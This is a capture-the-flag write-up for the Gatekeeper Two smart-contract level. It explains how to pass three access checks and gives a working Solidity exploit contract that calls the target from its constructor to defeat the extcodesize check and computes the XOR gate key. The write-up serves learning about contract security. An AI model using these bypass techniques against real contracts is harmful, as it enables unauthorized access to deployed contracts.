#GATEKEEPER TWO

##Objective : 
to become the entrant and complete the level.

##analysis: 
gate One:
msg.sender should not be equal to tx.origin.
same as in telephone challenge.
create a contract to pass the validation.

gateTwo : 
extcodesize is one such opcode that returns the code's size of any address.
variable x is used to make sure that size of the contract is 0.


gateThree:
simple XOR logic. 

##solution :
create a contract that such that callers address is tx.origin and our deployed contracts address will be the msg.sender.

During a contract's initialization, or when it's constructor is being called, its runtime code size will always be 0. 

exploit code will be called from inside of our contract's constructor to go through the second gate. 

to find the _gateKey :
bytes8 myKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (uint64(0) - 1));

##exploit:
```// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface GatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}
contract Hack {
    constructor() public {
        GatekeeperTwo Hack = GatekeeperTwo(<addr>);
        bytes8 myKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ uint64(~0));
        Hack.enter(myKey);        
    }
}
```

##takeaways :
 During a contract's initialization, or when it's constructor is being called, its runtime code size will always be 0. 



